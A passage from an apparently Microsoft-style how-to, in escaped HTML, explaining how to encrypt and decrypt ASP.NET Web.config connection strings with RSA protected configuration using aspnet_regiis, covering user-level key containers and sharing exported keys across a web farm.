&lt;p&gt;&lt;strong&gt;aspnet_regiis -pd &amp;quot;connectionStrings&amp;quot; -app &amp;quot;/MachineRSA&amp;quot;&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;If the command is successful, you will see the following output: &lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Decrypting configuration section...Succeeded!  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;To decrypt the &lt;strong&gt;connectionStrings&lt;/strong&gt; section that specifies a physical path to your application's configuration file, use the
&lt;strong&gt;-pdf&lt;/strong&gt; switch as shown here. &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;aspnet_regiis -pdf &amp;quot;connectionStrings&amp;quot; C:\Projects\MachineRSA&lt;/strong&gt;
&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h2&gt;Using RSA with a User-level Key Container to Encrypt a Connection String in Web.config&lt;/h2&gt;
&lt;p&gt;The following steps show you how to encrypt a &amp;lt;&lt;strong&gt;connectionStrings&lt;/strong&gt;&amp;gt; section by using the
&lt;strong&gt;RSAProtectedConfigurationProvider&lt;/strong&gt; (RSA) with a user-level key container.&lt;/p&gt;
&lt;p&gt;By default, the ASP.NET applications run under the NT AUTHORITY \ Network Service account. When you access encrypted configuration sections using RSA encryption with the user-level key container, make sure that your application is running with the same user
 identity as the account you used to encrypt the data. &lt;/p&gt;
&lt;h3&gt;To encrypt the connectionStrings section in Web.config &lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Create a new Web site named UserRSA. Make sure that this directory is configured as a virtual directory.
&lt;/li&gt;&lt;li&gt;Add a Web.config configuration file to this directory. &lt;/li&gt;&lt;li&gt;Add a sample &lt;strong&gt;connectionString&lt;/strong&gt; similar to the following example:
&lt;div&gt;
&lt;pre&gt;&amp;lt;connectionStrings&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;add name=&amp;quot;MyLocalSQLServer&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; connectionString=&amp;quot;Initial Catalog=aspnetdb;data source=localhost;Integrated Security=SSPI;&amp;quot;&lt;br&gt;       providerName=&amp;quot;System.Data.SqlClient&amp;quot; /&amp;gt;&lt;br&gt;&amp;lt;/connectionStrings&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;Add and configure a protected configuration provider to use a user-level key container. To do this, add the following &amp;lt;&lt;strong&gt;configProtectedData&lt;/strong&gt;&amp;gt; section to your Web.config file. You must set
&lt;strong&gt;useMachineContainer&lt;/strong&gt;=&lt;strong&gt; &amp;quot;false&amp;quot;&lt;/strong&gt; to instruct the provider to use the user-level key container. You must also use a unique provider name or a run-time error will be generated.
&lt;div&gt;
&lt;pre&gt;&amp;lt;configProtectedData&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;providers&amp;gt;&amp;nbsp;&amp;nbsp; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;add keyContainerName=&amp;quot;NetFrameworkConfigurationKey&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;    useMachineContainer=&amp;quot;false&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;    description=&amp;quot;Uses RsaCryptoServiceProvider to encrypt and decrypt&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;    name=&amp;quot;MyUserRSAProtectedConfigurationprovider&amp;quot; &lt;br&gt;         type=&amp;quot;System.Configuration.RsaProtectedConfigurationProvider,System.Configuration,&lt;br&gt;               Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/providers&amp;gt;&amp;nbsp;&amp;nbsp; &lt;br&gt;&amp;lt;/configProtectedData&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;Run the following command from an SDK Command Prompt to encrypt the &lt;strong&gt;connectionStrings&lt;/strong&gt; section:
&lt;p&gt;&lt;strong&gt;aspnet_regiis -pe &amp;quot;connectionStrings&amp;quot; -app &amp;quot;/UserRSA&amp;quot; -prov &amp;quot;MyUserRSAProtectedConfigurationProvider&amp;quot;&lt;/strong&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The &lt;strong&gt;-pe&lt;/strong&gt; switch specifies the configuration section to encrypt. This is the XML element name of the configuration section.
&lt;p&gt;For nested elements, such as the &amp;lt;&lt;strong&gt;pages&lt;/strong&gt;&amp;gt; section, which is inside &amp;lt;&lt;strong&gt;system.web&lt;/strong&gt;&amp;gt;, the XML name must include the containing section groups; for example,
&lt;strong&gt;&amp;quot;system.web/pages&amp;quot;&lt;/strong&gt;. &lt;/p&gt;
&lt;/li&gt;&lt;li&gt;The &lt;strong&gt;-app&lt;/strong&gt; switch specifies your Web application's virtual path. If it is a nested application, you need to specify the nested path from the root directory; for example,
&lt;strong&gt;&amp;quot;/test/aspnet/MachineRSA&amp;quot;&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;The &lt;strong&gt;-prov&lt;/strong&gt; switch specifies the provider name. In this case, this is set to
&lt;strong&gt;&amp;quot;MyUserRSAProtectedConfigurationProvider&amp;quot;&lt;/strong&gt; which is the name you specified when configuring the provider in step 4.
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;If the command is successful, you will see the following output: &lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Encrypting configuration section...Succeeded!  &lt;/pre&gt;
&lt;/div&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;RSA user-level key containers are stored in the following folder.&lt;/blockquote&gt;
&lt;blockquote&gt;\Documents and Settings\{UserName}\Application Data\Microsoft\Crypto\RSA&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;Review the Web.config and examine the changes. The following elements are created.
&lt;ul&gt;
&lt;li&gt;&amp;lt;&lt;strong&gt;EncryptedData&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;EncryptionMethod&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;KeyInfo&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;EncryptedKey&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;KeyName&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;CipherData&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;CipherValue&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Your modified Web.Config file, with the &lt;strong&gt;connectionStrings&lt;/strong&gt; section encrypted, should be similar to the following example:
&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;...&lt;br&gt;  &amp;lt;connectionStrings configProtectionProvider=&amp;quot;MyUserRSAProtectedConfigurationprovider&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;EncryptedData Type=&amp;quot;&lt;a href="http://www.w3.org/2001/04/xmlenc#Element"&gt;http://www.w3.org/2001/04/xmlenc#Element&lt;/a&gt;&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;              xmlns=&amp;quot;&lt;a href="http://www.w3.org/2001/04/xmlenc"&gt;http://www.w3.org/2001/04/xmlenc&lt;/a&gt;#&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;EncryptionMethod Algorithm=&amp;quot;&lt;a href="http://www.w3.org/2001/04/xmlenc#tripledes-cbc"&gt;http://www.w3.org/2001/04/xmlenc#tripledes-cbc&lt;/a&gt;&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;KeyInfo xmlns=&amp;quot;&lt;a href="http://www.w3.org/2000/09/xmldsig"&gt;http://www.w3.org/2000/09/xmldsig&lt;/a&gt;#&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;EncryptedKey xmlns=&amp;quot;&lt;a href="http://www.w3.org/2001/04/xmlenc"&gt;http://www.w3.org/2001/04/xmlenc&lt;/a&gt;#&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;EncryptionMethod Algorithm=&amp;quot;&lt;a href="http://www.w3.org/2001/04/xmlenc#rsa-1_5"&gt;http://www.w3.org/2001/04/xmlenc#rsa-1_5&lt;/a&gt;&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;KeyInfo xmlns=&amp;quot;&lt;a href="http://www.w3.org/2000/09/xmldsig"&gt;http://www.w3.org/2000/09/xmldsig&lt;/a&gt;#&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;KeyName&amp;gt;Rsa Key&amp;lt;/KeyName&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/KeyInfo&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;CipherData&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;CipherValue&amp;gt;In7jNc0GA1eE5nvVR2hrHQ6cC1O1kMbfBXH0alBwlY2OBM4sMa8NbK4pBnUdxFkrx&amp;#43;oSzLYE8SHS6dYZwE3Uf5x7hk46Jx&amp;#43;Z/&lt;br&gt;                         hn1hneWMyxWn23t41708lQzySsotYnzL5VOdR4P7MrIlhW9eSpbWp7PopSzcLxlGbs41dH7L3E=&lt;br&gt;            &amp;lt;/CipherValue&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/CipherData&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/EncryptedKey&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/KeyInfo&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;CipherData&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;CipherValue&amp;gt;Zbu2LQQeiHaUFXWPjLvPR9OLwrozCZj5i2zvcEFlx/&lt;br&gt;                     UICt2Cn0fTdy51dbHQRjTUXnOyx2PC5vptALXsvxrhPo5I&amp;#43;&lt;br&gt;                     I2SCr21rRUQ5H55P0ejJZMsAirkNjdhCe5RflVLdK96a6Sw0cz93inWi4rNkE1SiXB76cD08Y&amp;#43;DHrsjmGkW8/&lt;br&gt;                     TeHCK2f4xSykmdJGRwpxxdt2&amp;#43;3DxMjQPfg39Xkr4JjRlE6FvQ/R6hkEyyqLmCxUxbTV/&lt;br&gt;                     &amp;#43;mcBcwyE3AzrbOIl&amp;#43;627SG1fP4ovLmMkNvjlTl5lCZnoj6&lt;br&gt;        &amp;lt;/CipherValue&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/CipherData&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/EncryptedData&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/connectionStrings&amp;gt;&lt;br&gt;...&lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;Add the following Default.aspx Web page to your application's virtual directory, and then browse to this page to verify that encryption and decryption works correctly.
&lt;div&gt;
&lt;pre&gt;&amp;lt;%@ Page Language=&amp;quot;C#&amp;quot; %&amp;gt;&lt;br&gt;&amp;lt;script runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; protected void Page_Load(object sender, EventArgs e)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Response.Write(&amp;quot;Clear text connection string is: &amp;quot; &amp;#43; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;            ConfigurationManager.ConnectionStrings[&amp;quot;MyLocalSQLServer&amp;quot;].ConnectionString);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;lt;/script&amp;gt;&lt;br&gt;&amp;lt;html&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;body /&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;Because your application must access the data using the same identity that you used to encrypt the data, you often need to run the encryption command using your application's service account identity. To do so, you can start a command Window by using the
&lt;strong&gt;runas&lt;/strong&gt; command as shown below specifying an appropriate domain and user name.
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Runas /profile /user:domain\user cmd&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;When you run Aspnet_regiis from the resulting command window, it uses the specified identity to perform the encryption. This allows the application that uses the same identity to decrypt the data at run time.
&lt;/p&gt;
&lt;p&gt;If your application runs under a different account than the one used to encrypt the data, ASP.NET will be unable to access the RSA user-level key container and will generate the following error:
&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Parser Error Message: Failed to decrypt using provider 'RsaProtectedConfigurationProvider'. &lt;br&gt;Error message from the provider: Keyset does not exist  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;To change the &lt;strong&gt;connectionStrings&lt;/strong&gt; section back to clear text, run the following command from the .NET command prompt:
&lt;p&gt;&lt;strong&gt;aspnet_regiis -pd &amp;quot;connectionStrings&amp;quot; -app &amp;quot;/UserRSA&amp;quot;&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;If the command is successful, you will see the following output: &lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Decrypting configuration section...Succeeded!  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Web Farm Scenarios&lt;/h1&gt;
&lt;p&gt;You can use RSA encryption in Web farms, because you can export RSA keys. You need to do this if you encrypt data in a Web.config file prior to deploying it to other servers in a Web farm. In this case, the private key required to decrypt the data must be
 exported and deployed to the other servers.&lt;/p&gt;
&lt;h2&gt;Using the RSA Provider to Encrypt a Connection String in Web.config in a Web Farm&lt;/h2&gt;
&lt;p&gt;To do this, you must create a custom RSA encryption key container and deploy the same key container on all servers in your Web farm. This won't work by default because the default RSA encryption key,
&lt;strong&gt;&amp;quot;NetFrameworkConfigurationKey&amp;quot;&lt;/strong&gt;, is different for each computer.&lt;/p&gt;
&lt;h3&gt;To use RSA encryption in a Web farm &lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Run the following command from a command prompt to create a custom RSA encryption key:
&lt;p&gt;&lt;strong&gt;aspnet_regiis -pc &amp;quot;CustomKeys&amp;quot; -exp&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;The &lt;strong&gt;-exp&lt;/strong&gt; switch indicates that the keys are exportable. &lt;/p&gt;
&lt;p&gt;If the command is successful, you will see the following output: &lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Creating RSA Key container...Succeeded!  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;You can verify that a custom key container exists by looking for the file and checking timestamps in the following location:
&lt;/p&gt;
&lt;p&gt;\Documents and Settings\All Users\Application Data\Microsoft\Crypto\RSA&lt;br&gt;
\MachineKeys &lt;/p&gt;
&lt;/li&gt;&lt;li&gt;Create a new Web project named WebFarmRSA. Make sure that this directory is configured as a virtual directory.
&lt;/li&gt;&lt;li&gt;Add a Web.config configuration file to this directory. &lt;/li&gt;&lt;li&gt;Add a sample &lt;strong&gt;connectionString&lt;/strong&gt; similar to the following example:
&lt;div&gt;
&lt;pre&gt;&amp;lt;connectionStrings&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;add name=&amp;quot;MyLocalSQLServer&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; connectionString=&amp;quot;Initial Catalog=aspnetdb;data source=localhost;Integrated Security=SSPI;&amp;quot; &lt;br&gt;       providerName=&amp;quot;System.Data.SqlClient&amp;quot; /&amp;gt;&lt;br&gt;&amp;lt;/connectionStrings&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;Add and configure a custom protected configuration provider. To do this, add the following &amp;lt;&lt;strong&gt;configProtectedData&lt;/strong&gt;&amp;gt; section to the Web.config file. Note that the key container name is set to
&lt;strong&gt;&amp;quot;CustomKeys&amp;quot;&lt;/strong&gt;, which is the name of the key container created previously.
&lt;div&gt;
&lt;pre&gt;...&lt;br&gt;&amp;lt;configProtectedData&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;providers&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;add keyContainerName=&amp;quot;CustomKeys&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;useMachineContainer=&amp;quot;true&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;description=&amp;quot;Uses RsaCryptoServiceProvider to encrypt and decrypt&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;name=&amp;quot;CustomProvider&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; type=&amp;quot;System.Configuration.RsaProtectedConfigurationProvider,System.Configuration,&lt;br&gt;             Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/providers&amp;gt;&lt;br&gt;&amp;lt;/configProtectedData&amp;gt;&lt;br&gt;...  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;Run the following command from an SDK Command Prompt to encrypt the &lt;strong&gt;connectionStrings&lt;/strong&gt; section using the custom RSA key:
&lt;p&gt;&lt;strong&gt;aspnet_regiis -pe &amp;quot;connectionStrings&amp;quot; -app &amp;quot;/WebFarmRSA&amp;quot; -prov &amp;quot;CustomProvider&amp;quot;&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;If the encryption is successful, you will see the following output: &lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Encrypting configuration section...Succeeded!  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;Review the Web.config file and examine the changes. The following elements are modified:
&lt;ul&gt;
&lt;li&gt;&amp;lt;&lt;strong&gt;EncryptedData&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;CipherData&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;CipherValue&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Your modified Web.Config file, with the &lt;strong&gt;connectionStrings&lt;/strong&gt; section encrypted, should be similar to the following example:
&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;...&lt;br&gt;  &amp;lt;connectionStrings configProtectionProvider=&amp;quot;CustomProvider&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;EncryptedData Type=&amp;quot;&lt;a href="http://www.w3.org/2001/04/xmlenc#Element"&gt;http://www.w3.org/2001/04/xmlenc#Element&lt;/a&gt;&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;              xmlns=&amp;quot;&lt;a href="http://www.w3.org/2001/04/xmlenc"&gt;http://www.w3.org/2001/04/xmlenc&lt;/a&gt;#&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;EncryptionMethod Algorithm=&amp;quot;&lt;a href="http://www.w3.org/2001/04/xmlenc#tripledes-cbc"&gt;http://www.w3.org/2001/04/xmlenc#tripledes-cbc&lt;/a&gt;&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;KeyInfo xmlns=&amp;quot;&lt;a href="http://www.w3.org/2000/09/xmldsig"&gt;http://www.w3.org/2000/09/xmldsig&lt;/a&gt;#&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;EncryptedKey xmlns=&amp;quot;&lt;a href="http://www.w3.org/2001/04/xmlenc"&gt;http://www.w3.org/2001/04/xmlenc&lt;/a&gt;#&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;EncryptionMethod Algorithm=&amp;quot;&lt;a href="http://www.w3.org/2001/04/xmlenc#rsa-1_5"&gt;http://www.w3.org/2001/04/xmlenc#rsa-1_5&lt;/a&gt;&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;KeyInfo xmlns=&amp;quot;&lt;a href="http://www.w3.org/2000/09/xmldsig"&gt;http://www.w3.org/2000/09/xmldsig&lt;/a&gt;#&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;KeyName&amp;gt;Rsa Key&amp;lt;/KeyName&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/KeyInfo&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;CipherData&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;CipherValue&amp;gt;MWOaFwkByLRrvoGYeFUPMmN7e9uwC0D7gFEeyxs3Obll710dLQvD5XaMWcRxg1WwtOE9nysPQRrIJUaCm0b26LGUoa/&lt;br&gt;                         giGEfvWnslU2kig9SPICzsQAqUSB/inhRckWceb2xdy7TT&amp;#43;EI/vfsu6itJwE2AicMCTwx5I828mP8lV4=&lt;br&gt;            &amp;lt;/CipherValue&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/CipherData&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/EncryptedKey&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/KeyInfo&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;CipherData&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;CipherValue&amp;gt;IKO9jezdlJ/k1snyw5&amp;#43;e11cd9IVTlVfHBHSiYLgICf1EnMNd5WxVDZWP1uOW2UaY3Muv7HrSZCRbqq6hfA2uh2rxy5qAzFP&amp;#43;iu7Sg/&lt;br&gt;                     ku1Zvbwfq8p1UWHvPCukeyrBypiv0wpJ9Tuif7oP4Emgaoa&amp;#43;ewLnETSN411Gow28EKcLpbKWJDOC/&lt;br&gt;                     9o7g503YM4cnIvkQOomkYlL&amp;#43;MzMb3Rc1FSLiM9ncKQLZi&amp;#43;&lt;br&gt;                     JkRhlDIxFlsrFpKJhdNf5A0Sq2P71ZLI6G6QDCehHyn3kCZyBmVWJ0ueoGWXV4y&lt;br&gt;        &amp;lt;/CipherValue&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/CipherData&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/EncryptedData&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/connectionStrings&amp;gt;&lt;br&gt;...&lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;Run the following command from a .NET command prompt to export the custom RSA encryption key:
&lt;p&gt;&lt;strong&gt;aspnet_regiis -px &amp;quot;CustomKeys&amp;quot; &amp;quot;C:\CustomKeys.xml&amp;quot; -pri&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;The &lt;strong&gt;-pri&lt;/strong&gt; switch causes the private and public key to be exported. This enables both encryption and decryption. Without the-&lt;strong&gt;pri&lt;/strong&gt; switch, you would only be able to encrypt data with the exported key.
&lt;/p&gt;
&lt;p&gt;If the command is successful, you will see the following output: &lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Exporting RSA Keys to file...Succeeded!  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;Deploy the application and the encrypted Web.config file on a different server computer. Also copy the CustomKeys.xml file to a local directory on the other server, for example to the C:\ directory.
&lt;/li&gt;&lt;li&gt;On the destination server, run the following command from a command prompt to import the custom RSA encryption keys:
&lt;p&gt;&lt;strong&gt;aspnet_regiis -pi &amp;quot;CustomKeys&amp;quot; &amp;quot;C:\CustomKeys.xml&amp;quot;&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;If the command is successful, you will see the following output: &lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Importing RSA Keys from file..Succeeded!  &lt;/pre&gt;
&lt;/div&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;After you have finished exporting and importing the RSA keys, it is important for security reasons to delete the CustomsKeys.xml file from both machines.
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;Grant access to the ASP.NET application identity.
&lt;p&gt;The account used to run your Web application must be able to read the RSA key container. If you are not sure which identity your application uses, you can check this by adding the following code to a Web page:
&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;using System.Security.Principal;&lt;br&gt;...&lt;br&gt;protected void Page_Load(object sender, EventArgs e)&lt;br&gt;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Response.Write(WindowsIdentity.GetCurrent().Name);&lt;br&gt;}  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;By default, ASP.NET applications on Windows Server 2003 run using the NT Authority\Network Service account. The following command grants this account access to the CustomKeys store:
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;aspnet_regiis -pa &amp;quot;CustomKeys&amp;quot; &amp;quot;NT Authority\Network Service&amp;quot;&lt;/strong&gt;
&lt;/p&gt;
